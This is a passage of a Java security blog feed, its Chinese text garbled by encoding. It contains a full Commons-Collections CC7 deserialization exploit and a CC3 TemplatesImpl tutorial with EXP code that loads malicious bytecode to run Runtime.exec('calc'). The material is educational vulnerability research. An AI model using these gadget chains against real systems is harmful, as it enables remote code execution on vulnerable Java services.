class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.AbstractMapDecorator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.AbstractMap;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC7EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class), <span class="hljs-comment">// æ„é€  setValue çš„å¯æ§å‚æ•°</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;&#125;);<br>        HashMap&lt;Object, Object&gt; hashMap1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        HashMap&lt;Object, Object&gt; hashMap2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">decorateMap1</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap1, chainedTransformer);<br>        decorateMap1.put(<span class="hljs-string">&quot;yy&quot;</span>, <span class="hljs-number">1</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">decorateMap2</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap2, chainedTransformer);<br>        decorateMap2.put(<span class="hljs-string">&quot;zZ&quot;</span>, <span class="hljs-number">1</span>);<br>        <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>        hashtable.put(decorateMap1, <span class="hljs-number">1</span>);<br>        hashtable.put(decorateMap2, <span class="hljs-number">1</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> ChainedTransformer.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(chainedTransformer, transformers);<br>        decorateMap2.remove(<span class="hljs-string">&quot;yy&quot;</span>);<br><br>        serialize(hashtable);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Javaå®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Javaå®‰å…¨</tag>
      
      <tag>CCé“¾</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaå®‰å…¨-CC3é“¾</title>
    <link href="/2025/09/05/Java%E5%AE%89%E5%85%A8-CC3%E9%93%BE/"/>
    <url>/2025/09/05/Java%E5%AE%89%E5%85%A8-CC3%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="Javaå®‰å…¨-CC3é“¾"><a href="#Javaå®‰å…¨-CC3é“¾" class="headerlink" title="Javaå®‰å…¨-CC3é“¾"></a>Javaå®‰å…¨-CC3é“¾</h1><h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><ul><li>jdk8u65</li><li>Commons-Collections 3.2.1</li></ul><h2 id="TemplatesImpl-è§£æ"><a href="#TemplatesImpl-è§£æ" class="headerlink" title="TemplatesImpl è§£æ"></a>TemplatesImpl è§£æ</h2><ul><li><strong>åˆ©ç”¨ ClassLoader#defineClass ç›´æ¥åŠ è½½å­—èŠ‚ç </strong>â€“åŠ¨æ€åŠ è½½å­—èŠ‚ç </li><li><code>defineClass</code> çš„èŒè´£æ˜¯ï¼š<strong>å°†ä¸€ä¸ªå­—èŠ‚æ•°ç»„ï¼ˆbyte[]ï¼‰ï¼Œå³ <code>.class</code> æ–‡ä»¶çš„äºŒè¿›åˆ¶å†…å®¹ï¼Œè½¬æ¢å¹¶æ³¨å†Œä¸º JVM ä¸­çš„ä¸€ä¸ªæœ‰æ•ˆçš„ <code>Class</code> å¯¹è±¡ã€‚</strong></li></ul><p><img src="https://drun1baby.top/2022/06/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8704-CC3%E9%93%BE/ClassLoaderDefineClass.png"></p><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥æ­£å‘çœ‹ï¼Œé¦–å…ˆæ˜¯ <code>loadClass()</code>ï¼Œå®ƒçš„ä½œç”¨æ˜¯ä»å·²åŠ è½½çš„ç±»ç¼“å­˜ã€çˆ¶åŠ è½½å™¨ç­‰ä½ç½®å¯»æ‰¾ç±»ï¼ˆè¿™é‡Œå®é™…ä¸Šæ˜¯åŒäº²å§”æ´¾æœºåˆ¶ï¼‰ï¼Œåœ¨å‰é¢æ²¡æœ‰æ‰¾åˆ°çš„æƒ…å†µä¸‹ï¼Œæ‰§è¡Œ <code>findClass()</code>ã€‚</p><p>å¯¹äº <code>findClass()</code> æ–¹æ³•</p><ul><li><p>æ ¹æ®åç§°æˆ–ä½ç½®åŠ è½½ .class å­—èŠ‚ç ,ç„¶åä½¿ç”¨ defineClassï¼Œä»£ç å®ä¾‹å¦‚ä¸‹ã€‚</p></li><li><p>é€šå¸¸ç”±å­ç±»å»å®ç°</p></li><li><p><code>defineClass()</code> çš„ä½œç”¨æ˜¯å¤„ç†å‰é¢ä¼ å…¥çš„å­—èŠ‚ç ï¼Œå°†å…¶å¤„ç†æˆçœŸæ­£çš„ Java ç±»ã€‚</p></li></ul><blockquote><p>æ­¤æ—¶çš„ <code>defineClass()</code> æ–¹æ³•æ˜¯æœ‰å±€é™æ€§çš„ï¼Œå› ä¸ºå®ƒåªæ˜¯åŠ è½½ç±»ï¼Œå¹¶ä¸æ‰§è¡Œç±»ã€‚è‹¥éœ€è¦æ‰§è¡Œï¼Œåˆ™éœ€è¦å…ˆè¿›è¡Œ <code>newInstance()</code> çš„å®ä¾‹åŒ–ã€‚</p></blockquote><p>ç°åœ¨æˆ‘ä»¬çš„ <code>defineClass()</code> æ–¹æ³•çš„ä½œç”¨åŸŸä¸º <code>protected</code>ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä½œç”¨åŸŸä¸º <code>public</code> çš„ç±»ï¼Œæ–¹ä¾¿æˆ‘ä»¬åˆ©ç”¨ã€‚</p><p>åœ¨ <code>TemplatesImpl</code> ç±»çš„ <code>static class TransletClassLoader</code> ä¸­æ‰¾åˆ°äº†æˆ‘ä»¬èƒ½å¤Ÿè¿ç”¨çš„ç±»ã€‚</p><p><img src="/img/CC3/c01.png"></p><p>æ­¤å¤„æ˜¯ä¸€ä¸ªdefaultæ–¹æ³•</p><p>ç»§ç»­æŸ¥æ‰¾ç”¨æ³•</p><p>æ¥åˆ°åŒä¸€ä¸ªç±»ä¸­çš„defineTransletClassesæ–¹æ³•ï¼Œä½†æ˜¯è¿™ä¸ªæ–¹æ³•æ˜¯ä¸€ä¸ªprivateæ–¹æ³•</p><p><img src="/img/CC3/c02.png"></p><p>ç»§ç»­è·Ÿè¿›ï¼Œæ¥åˆ°è¿˜æ˜¯åŒä¸€ä¸ªç±»ä¸‹çš„ <code>getTransletInstance()</code> æ–¹æ³•</p><p>è°ƒç”¨äº† <code>defineTransletClasses()</code> æ–¹æ³•ï¼Œå¹¶ä¸”è¿™é‡Œæœ‰ä¸€ä¸ª <code>newInstance()</code> å®ä¾‹åŒ–çš„è¿‡ç¨‹ï¼Œå¦‚æœèƒ½èµ°å®Œè¿™ä¸ªå‡½æ•°é‚£ä¹ˆå°±èƒ½åŠ¨æ€æ‰§è¡Œä»£ç </p><p><img src="/img/CC3/c03.png"></p><p>ä½†æ˜¯å®ƒæ˜¯ç§æœ‰çš„ï¼Œæ‰€ä»¥ç»§ç»­æ‰¾</p><p>æ‰¾åˆ°ä¸€ä¸ªpublicæ–¹æ³•</p><p><img src="/img/CC3/c04.png"></p><h2 id="TemplatesImpl-åˆ©ç”¨"><a href="#TemplatesImpl-åˆ©ç”¨" class="headerlink" title="TemplatesImpl åˆ©ç”¨"></a>TemplatesImpl åˆ©ç”¨</h2><p>åœ¨åˆ†æè¿‡ç¨‹æˆ‘ä»¬è¯´åˆ°åªè¦èµ°è¿‡ <code>getTransletInstance()</code> æ–¹æ³•å³å¯ï¼Œå› ä¸ºè¿™ä¸ªæ–¹æ³•å†…è°ƒç”¨äº† <code>newInstance()</code> æ–¹æ³•ï¼Œç”¨ä¼ªä»£ç æ¥è¡¨ç¤ºçš„è¯å¦‚ä¸‹ã€‚</p><p>è¿™ä¸ªç±»æ˜¯ç»§æ‰¿äº†Serializableæ¥å£çš„ï¼Œå¯ä»¥åºåˆ—åŒ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>templates.newTransformer();  <span class="hljs-comment">// å› ä¸ºæ˜¯ä¸€å±‚å±‚è°ƒç”¨çš„ï¼Œæˆ‘ä»¬éœ€è¦åç»­èµ‹å€¼</span><br></code></pre></td></tr></table></figure><p>è·Ÿè¿›åˆ°getTransletInstanceæ–¹æ³•æŸ¥çœ‹ä»£ç æ‰§è¡Œæ¡ä»¶</p><p>_nameä¸ä¸ºç©ºï¼Œ _classä¸ºç©º</p><p><img src="/img/CC3/c05.png"></p><p>ç»§ç»­è·Ÿè¿›</p><p>_bytecodesä¸ä¸ºç©ºï¼Œ _tfactoryä¸ä¸ºç©º</p><p><img src="/img/CC3/c06.png"></p><h3 id="ç¼–å†™EXP"><a href="#ç¼–å†™EXP" class="headerlink" title="ç¼–å†™EXP"></a>ç¼–å†™EXP</h3><ul><li><code>_bytecodes</code>æ„é€ </li></ul><p><code>_bytecodes</code> çš„å€¼ï¼Œè¿™é‡Œéœ€è¦çš„æ˜¯ä¸€ä¸ªäºŒç»´æ•°ç»„ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªäºŒç»´æ•°ç»„ã€‚ä½†æ˜¯ <code>_bytecodes</code> ä½œä¸ºä¼ é€’è¿› defineClass æ–¹æ³•çš„å€¼æ˜¯ä¸€ä¸ªä¸€ç»´æ•°ç»„ã€‚è€Œè¿™ä¸ªä¸€ç»´æ•°ç»„é‡Œé¢æˆ‘ä»¬éœ€è¦å­˜æ”¾æ¶æ„çš„å­—èŠ‚ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Test.class&quot;</span>));<br><span class="hljs-type">byte</span>[][] codes=&#123;code&#125;;<br>bytecodes.set(templates,codes);<br></code></pre></td></tr></table></figure><p>æµ‹è¯•ç”¨javaæ–‡ä»¶ï¼Œè¦ç¼–è¯‘ä¸ºClassæ–‡ä»¶</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>        <span class="hljs-keyword">static</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>_tfactory</code> æ„é€ </li></ul><p><code>_tfactory</code> çš„å€¼åœ¨ <code>TemplatesImpl</code> è¿™ä¸€ç±»ä¸­è¢«å®šä¹‰å¦‚ä¸‹ï¼Œå…³é”®å­—æ˜¯ <code>transient</code>ï¼Œè¿™å°±å¯¼è‡´äº†è¿™ä¸ªå˜é‡åœ¨åºåˆ—åŒ–ä¹‹åæ— æ³•è¢«è®¿é—®ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> <span class="hljs-type">TransformerFactoryImpl</span> <span class="hljs-variable">_tfactory</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br></code></pre></td></tr></table></figure><p>ç›´æ¥ä¿®æ”¹æ˜¯ä¸è¡Œçš„ï¼Œä½†æ˜¯æˆ‘ä»¬è¿™é‡Œçš„åˆ©ç”¨è¦æ±‚æ¯”è¾ƒä½ï¼Œåªè¦è®© <code>_tfactory</code> ä¸ä¸º null å³å¯ï¼Œæˆ‘ä»¬å»çœ‹ä¸€çœ‹ <code>_tfactory</code> çš„å…¶ä»–å®šä¹‰å¦‚ä½•ã€‚</p><p>åœ¨ <code>readObject()</code> æ–¹æ³•ä¸­ï¼Œæ‰¾åˆ°äº† <code>_tfactory</code> çš„åˆå§‹åŒ–å®šä¹‰ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">_tfactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>();<br></code></pre></td></tr></table></figure><p>åªè¦æ»¡è¶³è¿™ä¸ªæ¡ä»¶å³å¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br></code></pre></td></tr></table></figure><p>æ­¤æ—¶çš„EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.TransformerConfigurationException;<br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> TransformerConfigurationException, NoSuchFieldException, IllegalAccessException, IOException &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-comment">//åå°„ä¿®æ”¹å±æ€§å€¼</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        name.set(templates,<span class="hljs-string">&quot;a&quot;</span>);<br><br>        <span class="hljs-comment">//defineClassæ–¹æ³•ä¼šå°†æ­¤å­—èŠ‚ç è½¬åŒ–ä¸ºClasså¯¹è±¡</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//æ„é€ è¯»å–å­—èŠ‚ç </span><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes=&#123;code&#125;;<br>        bytecodes.set(templates,codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br><br>        templates.newTransformer();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿è¡Œåæœ‰æŠ¥é”™</p><p><img src="/img/CC3/c07.png"></p><h3 id="æŠ¥é”™è§£å†³"><a href="#æŠ¥é”™è§£å†³" class="headerlink" title="æŠ¥é”™è§£å†³"></a>æŠ¥é”™è§£å†³</h3><p>æ ¹æ®æŠ¥é”™æç¤ºï¼Œæˆ‘ä»¬æ¥åˆ°defineTransletClassesæ–¹æ³•ï¼Œä¸‹ä¸€ä¸ªæ–­ç‚¹</p><p>å‘ç°é—®é¢˜å‡ºåœ¨ifè¯­å¥ä¸­æ¡ä»¶æœªæ»¡è¶³</p><p>å¦‚æœæˆ‘ä»¬ä¼ å…¥å­—èŠ‚ç å¯¹è±¡çš„çˆ¶ç±»ä¸ä¸ºABSTRACT_TRANSLETï¼Œä¼šç›´æ¥æŠ›å‡ºå¼‚å¸¸</p><p><img src="/img/CC3/c08.png"></p><p>æˆ‘ä»¬è®©Testç±»ç»§æ‰¿AbstractTransletå°±å¯ä»¥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>); <span class="hljs-comment">// ä½ çš„payload</span><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç¼–è¯‘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">javac -<span class="hljs-built_in">source</span> 8 -target 8 Test.java<br></code></pre></td></tr></table></figure><p>å†è¿è¡Œå³å¯å¼¹å‡ºè®¡ç®—å™¨</p><p><img src="/img/CC3/c09.png"></p><h2 id="CC1-é“¾çš„-TemplatesImpl-çš„å®ç°æ–¹å¼"><a href="#CC1-é“¾çš„-TemplatesImpl-çš„å®ç°æ–¹å¼" class="headerlink" title="CC1 é“¾çš„ TemplatesImpl çš„å®ç°æ–¹å¼"></a>CC1 é“¾çš„ TemplatesImpl çš„å®ç°æ–¹å¼</h2><blockquote><p>TemplatesImpl åªæ˜¯å°†åŸæœ¬çš„å‘½ä»¤æ‰§è¡Œå˜æˆä»£ç æ‰§è¡Œçš„æ–¹å¼æ‰€ä»¥åœ¨ä¸è€ƒè™‘é»‘åå•çš„æƒ…å†µä¸‹ï¼Œå¦‚æœå¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œåˆ™ä¸€å®šå¯ä»¥é€šè¿‡åŠ¨æ€åŠ è½½å­—èŠ‚ç è¿›è¡Œä»£ç æ‰§è¡Œã€‚</p></blockquote><p>å°†CC1æ”¹ä¸ºä»£ç æ‰§è¡Œçš„æ–¹å¼</p><p><img src="https://drun1baby.top/2022/06/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8704-CC3%E9%93%BE/Diff.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//åå°„è°ƒç”¨newTransformer</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        chainedTransformer.transform(<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p>æœ€åä¸€å¥ï¼Œä¼ å…¥ <code>chainedTransformer.transform(1)</code> æ˜¯å› ä¸ºå‰é¢æˆ‘ä»¬å®šä¹‰äº† <code>new 